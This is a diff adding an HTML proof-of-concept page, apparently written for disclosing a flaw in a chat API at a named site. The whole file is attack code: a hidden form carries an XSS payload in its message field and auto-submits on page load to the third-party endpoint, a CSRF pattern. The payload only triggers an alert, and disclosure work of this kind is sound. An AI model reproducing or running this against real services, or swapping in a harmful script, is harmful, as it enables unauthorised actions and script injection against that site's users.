@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+
+<html>
+  <body>
+    <h2>AIC Chat Endpoint PoC</h2>
+
+```
+<form action="https://www.aic.sg/api/tandem/chat" method="POST">
+  <input type="hidden" name="message" value='"><img src=x onerror=alert("XSS")>'>
+  <input type="hidden" name="sessionToken" value="">
+  <input type="hidden" name="ts" value="">
+  <input type="hidden" name="state" value="">
+  <input type="submit" value="Send Request">
+</form>
+
+<script>
+  // Auto-submit for demonstration
+  document.forms[0].submit();
+</script>
+```
+
+  </body>
+</html>
